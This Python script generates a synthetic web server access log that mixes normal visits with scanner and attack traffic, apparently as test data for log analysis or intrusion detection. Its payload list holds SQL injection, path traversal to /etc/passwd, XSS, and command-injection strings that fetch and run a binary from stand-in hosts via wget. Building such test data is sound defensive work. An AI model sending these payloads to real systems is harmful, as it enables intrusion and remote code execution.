from pathlib import Path
from datetime import datetime, timedelta
import random
import urllib.parse

OUTPUT_PATH = Path("C:/Users/lenovo/Desktop/generated1_access.txt")
TOTAL_LINES = 10000
random.seed(42)

normal_ips = [
    "192.168.50.10",
    "192.168.50.11",
    "192.168.50.12",
    "192.168.50.13",
    "192.168.50.14",
    "10.10.0.21",
    "10.10.0.22",
    "10.10.0.23",
    "10.10.0.24",
    "10.10.0.25",
    "203.0.113.101",
    "203.0.113.102",
    "203.0.113.103",
    "203.0.113.104",
    "203.0.113.105",
]
malicious_open_ua_ips = [
    "45.90.57.11",
    "45.90.57.12",
    "45.90.57.13",
    "185.199.110.41",
    "185.199.110.42",
]

malicious_hidden_ua_ips = [
    "198.51.100.201",
    "198.51.100.202",
    "198.51.100.203",
    "198.51.100.204",
    "198.51.100.205",
]
malicious_obfuscated_ips = [
    "172.20.10.44",
    "172.20.10.45",
    "172.20.10.46",
    "172.20.10.47",
    "172.20.10.48",
]
normal_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

scanner_user_agents = [
    "sqlmap/1.8.3#stable (https://sqlmap.org)",
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "ffuf/2.1.0",
    "gobuster/3.6",
    "Hydra",
    "Nikto/2.5.0",
    "Skipfish/2.10b",
    "WPScan v3.8.25",
]

hidden_scanner_user_agents = [
    normal_user_agents[0],
    normal_user_agents[1],
    normal_user_agents[2],
]

normal_paths = [
    "/",
    "/index.html",
    "/about",
    "/contact",
    "/products",
    "/products/12",
    "/products/43",
    "/cart",
    "/checkout",
    "/static/css/style.css",
    "/static/js/app.js",
    "/static/img/logo.png",
    "/api/v1/status",
    "/api/v1/user/profile",
    "/api/v1/products?page=1",
    "/api/v1/products?page=2",
    "/search?q=laptop",
    "/search?q=phone",
]

scanner_paths = [
    "/admin",
    "/admin/login",
    "/administrator",
    "/phpmyadmin",
    "/phpMyAdmin",
    "/server-status",
    "/.env",
    "/.git/config",
    "/backup.zip",
    "/db.sql",
    "/config.php",
    "/wp-login.php",
    "/wp-admin/",
    "/xmlrpc.php",
    "/wp-content/plugins/",
    "/wp-content/themes/",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
]

bruteforce_paths = [
    "/login",
    "/admin/login",
    "/wp-login.php",
    "/api/v1/login",
]

obfuscated_payloads = [
    "/search?q=%27%20OR%20%271%27%3D%271",
    "/search?q=%22%20OR%20%221%22%3D%221",
    "/search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--",
    "/product?id=1%20UNION%20SELECT%201,2,3--",
    "/product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users",
    "/index.php?page=..%2F..%2F..%2Fetc%2Fpasswd",
    "/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "/shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin",
    "/shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx",
    "/api/v1/user?id=1%27%2bOR%2b%271%27%3d%271",
    "/redirect?url=http%3A%2F%2Fevil.example%2Fphish",
    "/comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
]

referrers = [
    "-",
    "https://www.google.com/",
    "https://yandex.ru/",
    "https://example.com/",
    "https://mail.example.com/",
]

status_by_path = {
    "/": 200,
    "/index.html": 200,
    "/about": 200,
    "/contact": 200,
    "/products": 200,
    "/cart": 200,
    "/checkout": 200,
    "/static/css/style.css": 200,
    "/static/js/app.js": 200,
    "/static/img/logo.png": 200,
}


def apache_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def random_size(status):
    if status in [301, 302]:
        return random.randint(180, 800)
    if status in [401, 403, 404]:
        return random.randint(40, 1200)
    if status >= 500:
        return random.randint(20, 500)
    return random.randint(500, 9000)


def log_line(ip, dt, method, path, status, size, referrer, user_agent):
    return (
        f'{ip} - - [{apache_time(dt)}] '
        f'"{method} {path} HTTP/1.1" '
        f'{status} {size} '
        f'"{referrer}" '
        f'"{user_agent}"'
    )


def make_normal_request(ip, dt):
    path = random.choice(normal_paths)
    method = "GET"

    if path in ["/checkout", "/api/v1/user/profile"] and random.random() < 0.25:
        method = "POST"

    status = status_by_path.get(path.split("?")[0], random.choices(
        [200, 302, 404],
        weights=[0.88, 0.07, 0.05],
        k=1
    )[0])

    return log_line(
        ip=ip,
        dt=dt,
        method=method,
        path=path,
        status=status,
        size=random_size(status),
        referrer=random.choice(referrers),
        user_agent=random.choice(normal_user_agents),
    )


def make_open_scanner_request(ip, dt):
    ua = random.choice(scanner_user_agents)
    path = random.choice(scanner_paths + bruteforce_paths + obfuscated_payloads)

    method = random.choices(
        ["GET", "POST", "HEAD"],
        weights=[0.72, 0.22, 0.06],
        k=1
    )[0]

    status = random.choices(
        [200, 301, 302, 401, 403, 404, 500],
        weights=[0.08, 0.03, 0.03, 0.08, 0.42, 0.32, 0.04],
        k=1
    )[0]

    return log_line(
        ip=ip,
        dt=dt,
        method=method,
        path=path,
        status=status,
        size=random_size(status),
        referrer="-",
        user_agent=ua,
    )


def make_hidden_scanner_request(ip, dt):
    ua = random.choice(hidden_scanner_user_agents)
    path = random.choice(scanner_paths + bruteforce_paths)

    if random.random() < 0.25:
        path = random.choice(obfuscated_payloads)

    method = random.choices(
        ["GET", "POST"],
        weights=[0.68, 0.32],
        k=1
    )[0]

    status = random.choices(
        [200, 302, 403, 404, 500],
        weights=[0.12, 0.08, 0.38, 0.38, 0.04],
        k=1
    )[0]

    return log_line(
        ip=ip,
        dt=dt,
        method=method,
        path=path,
        status=status,
        size=random_size(status),
        referrer=random.choice(["-", "https://www.google.com/"]),
        user_agent=ua,
    )


def make_obfuscated_request(ip, dt):
    ua = random.choice(hidden_scanner_user_agents)
    path = random.choice(obfuscated_payloads)

    if random.random() < 0.45:
        path = urllib.parse.quote(path, safe="/?=&%")

    method = random.choices(
        ["GET", "POST"],
        weights=[0.8, 0.2],
        k=1
    )[0]

    status = random.choices(
        [200, 403, 404, 500],
        weights=[0.1, 0.55, 0.25, 0.1],
        k=1
    )[0]

    return log_line(
        ip=ip,
        dt=dt,
        method=method,
        path=path,
        status=status,
        size=random_size(status),
        referrer="-",
        user_agent=ua,
    )


def generate_access_log(total_lines=TOTAL_LINES):
    lines = []
    current_time = datetime(2026, 5, 21, 8, 0, 0)

    for _ in range(total_lines):
        current_time += timedelta(seconds=random.randint(1, 8))

        traffic_type = random.choices(
            ["normal", "open_scanner", "hidden_scanner", "obfuscated"],
            weights=[0.72, 0.10, 0.10, 0.08],
            k=1,
        )[0]

        if traffic_type == "normal":
            ip = random.choice(normal_ips)
            line = make_normal_request(ip, current_time)
        elif traffic_type == "open_scanner":
            ip = random.choice(malicious_open_ua_ips)
            line = make_open_scanner_request(ip, current_time)
        elif traffic_type == "hidden_scanner":
            ip = random.choice(malicious_hidden_ua_ips)
            line = make_hidden_scanner_request(ip, current_time)
        else:
            ip = random.choice(malicious_obfuscated_ips)
            line = make_obfuscated_request(ip, current_time)

        lines.append(line)

    random.shuffle(lines)
    return lines


def main():
    lines = generate_access_log(TOTAL_LINES)
    OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)

    with open(OUTPUT_PATH, "w", encoding="utf-8") as f:
        for line in lines:
            f.write(line + "\n")

    print(f"created: {OUTPUT_PATH}")
    print(f"lines: {len(lines)}")


if __name__ == "__main__":
    main()